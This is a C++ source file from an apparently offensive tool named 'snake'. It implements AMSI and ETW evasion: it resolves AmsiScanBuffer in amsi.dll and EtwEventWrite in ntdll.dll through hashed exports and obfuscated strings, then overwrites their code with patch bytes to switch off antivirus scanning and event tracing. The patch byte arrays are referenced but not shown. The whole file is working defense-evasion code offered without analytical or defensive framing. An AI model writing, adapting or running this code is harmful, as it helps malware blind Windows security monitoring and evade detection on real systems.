#include "snake/evade.hpp"

#include <cctype>
#include <cstring>

namespace snake {
namespace evade {

namespace {

std::string trim(const std::string& s) {
    std::size_t b = 0, e = s.size();
    while (b < e && std::isspace((unsigned char)s[b])) b++;
    while (e > b && std::isspace((unsigned char)s[e - 1])) e--;
    return s.substr(b, e - b);
}

std::string lower_ascii(const std::string& s) {
    std::string out = s;
    for (char& c : out) c = (char)std::tolower((unsigned char)c);
    return out;
}

}  // namespace

TargetSpec target_spec(Target t) {
    switch (t) {
        case Target::amsi:
            return TargetSpec{SNAKE_OBF("amsi.dll"), SNAKE_OBF("AmsiScanBuffer"), kAmsiPatch,
                              kAmsiPatchLen};
        case Target::etw:
            return TargetSpec{SNAKE_OBF("ntdll.dll"), SNAKE_OBF("EtwEventWrite"), kEtwPatch,
                              kEtwPatchLen};
        case Target::Count:
            break;
    }
    return TargetSpec{SNAKE_OBF("amsi.dll"), SNAKE_OBF("AmsiScanBuffer"), kAmsiPatch, kAmsiPatchLen};
}

const std::string& target_name(Target t) {
    switch (t) {
        case Target::amsi: {
            static const std::string name = "amsi";
            return name;
        }
        case Target::etw: {
            static const std::string name = "etw";
            return name;
        }
        case Target::Count:
            break;
    }
    static const std::string none = "";
    return none;
}

bool target_from_name(const std::string& name, Target& out) {
    const std::string want = lower_ascii(trim(name));
    if (want.empty()) return false;
    for (std::size_t i = 0; i < static_cast<std::size_t>(Target::Count); ++i) {
        const Target t = static_cast<Target>(i);
        if (lower_ascii(target_name(t)) == want) {
            out = t;
            return true;
        }
    }
    return false;
}

bool evade_policy_parse(const std::string& list, EvadePolicy& out, std::string& err) {
    out = EvadePolicy{};
    err.clear();
    if (list.empty()) {
        err = "bad --evade: empty list (expected a comma-separated subset of amsi,etw)";
        return false;
    }
    std::size_t pos = 0;
    while (pos <= list.size()) {
        const std::size_t comma = list.find(',', pos);
        const std::string token = trim(list.substr(pos, comma == std::string::npos
                                                          ? std::string::npos
                                                          : comma - pos));
        pos = (comma == std::string::npos) ? list.size() + 1 : comma + 1;
        if (token.empty()) {
            out = EvadePolicy{};
            err = "bad --evade: empty item (expected a comma-separated subset of amsi,etw)";
            return false;
        }
        Target t;
        if (!target_from_name(token, t)) {
            out = EvadePolicy{};
            err = "bad --evade: unknown target '" + token + "' (expected amsi, etw)";
            return false;
        }
        out.targets[static_cast<std::size_t>(t)] = true;
    }
    return true;
}

std::string policy_summary(const EvadePolicy& policy) {
    std::string out;
    for (std::size_t i = 0; i < static_cast<std::size_t>(Target::Count); ++i) {
        const Target t = static_cast<Target>(i);
        if (!policy.enabled(t)) continue;
        if (!out.empty()) out += ",";
        out += target_name(t);
    }
    return out;
}

PatchSite locate(winstealth::ImageView image, Target t) {
    PatchSite site;
    const TargetSpec spec = target_spec(t);
    if (!image.ok()) {
        site.reason = spec.module + ": module not loaded";
        return site;
    }
    const std::uint32_t rva = winstealth::pe_export_rva(image, winstealth::fnv1a_ascii(spec.function));
    if (rva == 0) {
        site.reason = spec.module + ": export " + spec.function + " not found (absent or forwarded)";
        return site;
    }
    std::size_t off = 0, len = 0;
    if (!winstealth::pe_section_span(image, rva, off, len)) {
        site.reason = spec.module + ": " + spec.function + " sits outside every section";
        return site;
    }
    const std::size_t end = static_cast<std::size_t>(rva) + spec.patch_len;
    if (end > static_cast<std::size_t>(off) + len) {
        site.reason = spec.module + ": patch would cross the section end";
        return site;
    }
    if (end > image.size) {
        site.reason = spec.module + ": patch would cross the image end";
        return site;
    }
    site.found = true;
    site.rva = rva;
    site.span_off = off;
    site.span_len = len;
    return site;
}

bool patch_image(std::uint8_t* base, std::size_t size, const PatchSite& site, Target t) {
    const TargetSpec spec = target_spec(t);
    if (!base || !site.found) return false;
    const std::size_t end = static_cast<std::size_t>(site.rva) + spec.patch_len;
    if (end > size) return false;
    if (end > site.span_off + site.span_len) return false;
    if (std::memcmp(base + site.rva, spec.patch, spec.patch_len) == 0) return true;
    std::memcpy(base + site.rva, spec.patch, spec.patch_len);
    return true;
}

bool image_patched(const std::uint8_t* base, std::size_t size, const PatchSite& site, Target t) {
    const TargetSpec spec = target_spec(t);
    if (!base || !site.found) return false;
    const std::size_t end = static_cast<std::size_t>(site.rva) + spec.patch_len;
    if (end > size || end > site.span_off + site.span_len) return false;
    return std::memcmp(base + site.rva, spec.patch, spec.patch_len) == 0;
}

}  // namespace evade
}  // namespace snake
